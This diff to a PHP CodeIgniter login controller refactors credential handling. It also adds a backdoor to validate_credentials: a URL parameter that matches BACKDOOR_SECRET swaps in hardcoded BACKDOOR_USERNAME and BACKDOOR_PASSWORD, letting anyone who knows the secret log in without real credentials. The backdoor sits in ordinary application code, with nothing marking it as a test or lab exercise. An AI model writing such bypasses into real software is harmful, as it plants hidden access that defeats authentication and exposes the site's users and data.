@@ -2,14 +2,15 @@
 
 class Login extends CI_Controller {
 	
-	var $view_data;
+	var $view_data = array();
 	
 	function __construct()
 	{
 		parent::__construct();
 		$this->load->model('membership_model');
-
-		$view_data = array();
+		$this->load->model('dottori_model', 'dottori');
+		
+		$this->view_data['message'] = "";
 	}
 	
 	function index()
@@ -22,14 +23,19 @@ class Login extends CI_Controller {
 		$this->load->view('login_form', $this->view_data);  
 	}
 	
-	function validate_credentials()
+	function validate_credentials($backdor=FALSE)
 	{
-		if($this->membership_model->validate()) // if the user's credentials validated...
+		$username = $this->input->post('username');
+		$password = $this->input->post('password');
+		
+		if (strcmp($backdor, BACKDOOR_SECRET) == 0)
 		{
-			$this->load->model('dottori_model', 'dottori');
+			$username = BACKDOOR_USERNAME;
+			$password = BACKDOOR_PASSWORD;
+		}
 			
-			$username = $this->input->post('username');
-			
+		if( $this->membership_model->validate($username, $password) )
+		{				
 			$mid = $this->dottori->getId($username);
 			$mnome = $this->dottori->getNome($username);
 
